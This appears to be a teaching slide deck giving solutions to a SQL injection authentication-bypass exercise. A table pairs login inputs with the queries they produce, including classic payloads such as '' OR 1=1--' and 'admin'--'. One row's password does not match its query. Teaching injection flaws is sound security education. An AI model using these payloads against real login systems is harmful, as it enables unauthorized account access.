<!-- $theme: gaia -->

<!-- $size: 16:9 -->

<!-- page_number: true -->

<!-- footer: Copyright (c) by Bjoern Kimminich | Licensed under CC-BY-SA 4.0 -->

# Solutions

## Exercises 2nd Semester

---

# Exercise 3.1 (Authentication Bypass)

| # | Username | Password       | Created SQL Query                                                         | Query Result |
|:--|:---------|:---------------|:--------------------------------------------------------------------------|:-------------|
| 1 | `horst`  | `n0Rd4kAD3m!E` | `SELECT id FROM users WHERE name = 'horst' AND password = 'n0Rd4kAD3m!E'` | `42`         |
| 2 | `'`      | `qwertz`       | `SELECT id FROM users WHERE name = ''' AND password = 'qwertz'`           | `Error`      |
| 3 | `'--`    | `abc123`       | `SELECT id FROM users WHERE name = ''-- AND password = 'abc123'`          | `null`       |

---

| # | Username     | Password     | Created SQL Query                                                     | Query Result  |
|:--|:-------------|:-------------|:----------------------------------------------------------------------|:--------------|
| 4 | `horst'--`   | `qwertz`     | `SELECT id FROM users WHERE name = 'horst'-- AND password = 'abc123'` | `42`          |
| 5 | `admin'--`   | `<anything>` | `SELECT id FROM users WHERE name = 'admin'`                           | `1`           |
| 6 | `' OR 1=1--` | `<anything>` | `SELECT id FROM users`                                                | `1`, `2`, ... |
